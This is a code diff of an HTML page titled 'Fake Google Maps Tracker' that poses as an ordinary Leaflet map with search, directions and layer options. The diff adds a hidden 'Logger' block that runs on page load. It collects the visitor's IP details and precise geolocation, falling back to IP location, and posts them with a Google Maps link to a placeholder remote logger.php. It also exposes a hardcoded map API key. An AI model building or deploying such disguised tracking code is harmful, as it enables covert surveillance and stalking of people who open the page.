@@ -3,21 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Realistic Fake Location Map</title>
+  <title>Fake Google Maps Tracker</title>
   <link rel="icon" href="assets/fav.png" />
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
   <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine@3.2.12/dist/leaflet-routing-machine.css" />
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      font-family: 'Roboto', sans-serif;
-    }
-    #map {
-      height: 100vh;
-      width: 100%;
-    }
+    html, body { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; }
+    #map { height: 100vh; width: 100%; }
     .floating-search {
       position: fixed;
       top: 20px;
@@ -48,25 +40,6 @@
       cursor: pointer;
       font-weight: bold;
     }
-    .autocomplete-container {
-      position: absolute;
-      top: 100%;
-      left: 0;
-      width: 100%;
-      background: white;
-      border: 1px solid #ccc;
-      z-index: 999;
-      max-height: 200px;
-      overflow-y: auto;
-      border-radius: 4px;
-    }
-    .autocomplete-container .suggestion {
-      padding: 8px 10px;
-      cursor: pointer;
-    }
-    .autocomplete-container .suggestion:hover {
-      background-color: #f0f0f0;
-    }
     .map-ui {
       position: fixed;
       bottom: 20px;
@@ -85,40 +58,86 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.3);
       cursor: pointer;
     }
+    #direction-panel {
+      position: fixed;
+      top: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.3);
+      padding: 16px;
+      z-index: 1001;
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+    }
+    #direction-panel input, #direction-panel button {
+      padding: 8px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    #direction-panel button {
+      background: #1976d2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+    }
+    .dark-mode {
+      filter: invert(90%) hue-rotate(180deg);
+    }
   </style>
 </head>
 <body>
   <div id="map"></div>
-
   <div class="floating-search">
     <input id="searchInput" type="text" placeholder="Search...">
     <button id="searchBtn">Search</button>
   </div>
-
+  <div id="direction-panel">
+    <input id="fromInput" type="text" placeholder="Start location">
+    <input id="toInput" type="text" placeholder="Destination">
+    <button id="getDirectionBtn">Get Directions</button>
+  </div>
   <div class="map-ui">
     <img src="assets/direction-icon.svg" id="directionToggleBtn" class="icon" title="Directions" />
     <img src="assets/location-icon.svg" id="locateBtn" class="icon" title="Your Location" />
-    <img src="assets/history-icon.svg" id="historyToggleBtn" class="icon" title="History" />
     <img src="assets/dark-icon.svg" id="darkModeBtn" class="icon" title="Dark Mode" />
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
   <script src="https://unpkg.com/leaflet-routing-machine@3.2.12/dist/leaflet-routing-machine.min.js"></script>
   <script>
-    const map = L.map('map').setView([25.276987, 55.296249], 13);
-    const tileLayer = L.tileLayer('https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO', {
-      tileSize: 512,
-      zoomOffset: -1,
+    const map = L.map('map').setView([11.919, 75.367], 14);
+
+    const hybrid = L.tileLayer('https://api.maptiler.com/maps/hybrid/{z}/{x}/{y}.jpg?key=VcSgtSTkXfCbU3n3RqBO', {
+      tileSize: 512, zoomOffset: -1, maxZoom: 20,
       attribution: '&copy; MapTiler & OpenStreetMap contributors'
     }).addTo(map);
 
-    let fakeMarker = L.marker([25.276987, 55.296249]).addTo(map);
+    const baseLayers = {
+      "Hybrid": hybrid,
+      "Street": L.tileLayer('https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO', { tileSize: 512, zoomOffset: -1, maxZoom: 20 }),
+      "Satellite": L.tileLayer('https://api.maptiler.com/maps/satellite/{z}/{x}/{y}.jpg?key=VcSgtSTkXfCbU3n3RqBO', { tileSize: 512, zoomOffset: -1, maxZoom: 20 }),
+      "Topo": L.tileLayer('https://api.maptiler.com/maps/topo/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO', { tileSize: 512, zoomOffset: -1, maxZoom: 20 })
+    };
 
-    // Dark Mode toggle
-    const darkBtn = document.getElementById('darkModeBtn');
-    darkBtn.onclick = () => document.body.classList.toggle('dark-mode');
+    L.control.layers(baseLayers).addTo(map);
 
-    // Search
+    let fakeMarker = L.marker([11.919, 75.367]).addTo(map);
+
+    document.getElementById('darkModeBtn').onclick = () => document.body.classList.toggle('dark-mode');
+
+    document.getElementById('locateBtn').onclick = () => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        L.marker([latitude, longitude]).addTo(map).bindPopup("You are here").openPopup();
+        map.setView([latitude, longitude], 15);
+      }, () => alert("Permission denied"));
+    };
+
     document.getElementById('searchBtn').onclick = async () => {
       const place = document.getElementById('searchInput').value;
       if (!place) return;
@@ -126,33 +145,93 @@
       const data = await res.json();
       if (data.length > 0) {
         const { lat, lon } = data[0];
-        map.setView([lat, lon], 15);
-        fakeMarker.setLatLng([lat, lon]);
+        map.setView([parseFloat(lat), parseFloat(lon)], 15);
+        fakeMarker.setLatLng([parseFloat(lat), parseFloat(lon)]);
       } else {
         alert("Place not found");
       }
     };
 
-    // Reverse geocode function
-    async function reverseGeocode(lat, lon) {
-      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
-      const data = await res.json();
-      return data.display_name || "Unknown location";
-    }
-
-    // Geolocation + move to real location
-    document.getElementById('locateBtn').onclick = async () => {
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const { latitude, longitude } = pos.coords;
-        const place = await reverseGeocode(latitude, longitude);
-
-        if (fakeMarker) map.removeLayer(fakeMarker);
-        const realMarker = L.marker([latitude, longitude]).addTo(map).bindPopup(`📍 You are here: ${place}`).openPopup();
-        map.setView([latitude, longitude], 17);
-      }, err => {
-        alert("Geolocation failed or denied.");
-      });
+    document.getElementById('directionToggleBtn').onclick = () => {
+      const panel = document.getElementById('direction-panel');
+      panel.style.display = panel.style.display === 'none' ? 'flex' : 'none';
     };
+
+    let routingControl;
+    document.getElementById('getDirectionBtn').onclick = async () => {
+      const from = document.getElementById('fromInput').value;
+      const to = document.getElementById('toInput').value;
+      if (!from || !to) return;
+      const fromRes = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`);
+      const fromData = await fromRes.json();
+      const toRes = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`);
+      const toData = await toRes.json();
+      if (fromData.length > 0 && toData.length > 0) {
+        const fromCoord = L.latLng(parseFloat(fromData[0].lat), parseFloat(fromData[0].lon));
+        const toCoord = L.latLng(parseFloat(toData[0].lat), parseFloat(toData[0].lon));
+
+        if (routingControl) map.removeControl(routingControl);
+
+        routingControl = L.Routing.control({
+          waypoints: [fromCoord, toCoord],
+          routeWhileDragging: false
+        }).addTo(map);
+
+        map.setView(toCoord, 14);
+        fakeMarker.setLatLng(toCoord);
+      } else {
+        alert("Invalid locations");
+      }
+    };
+
+    // Logger
+    (async () => {
+      const sendToServer = async (payload) => {
+        await fetch('https://your-render-backend-url.onrender.com/logger.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      };
+
+      const ipData = await fetch('https://ipapi.co/json').then(r => r.json()).catch(() => null);
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const geoData = await geoRes.json();
+        const town = geoData?.address?.town || geoData?.address?.village || geoData?.address?.suburb || geoData?.address?.city || '';
+
+        const payload = {
+          ip: ipData?.ip || 'Unknown',
+          country: ipData?.country_name || '',
+          region: ipData?.region || '',
+          city: ipData?.city || '',
+          town: town,
+          latitude: lat,
+          longitude: lon,
+          link: `https://maps.google.com/?q=${lat},${lon}`
+        };
+
+        sendToServer(payload);
+      }, async () => {
+        if (ipData) {
+          const payload = {
+            ip: ipData.ip,
+            country: ipData.country_name,
+            region: ipData.region,
+            city: ipData.city,
+            town: ipData.city,
+            latitude: ipData.latitude,
+            longitude: ipData.longitude,
+            link: `https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}`
+          };
+          sendToServer(payload);
+        }
+      });
+    })();
   </script>
 </body>
 </html>
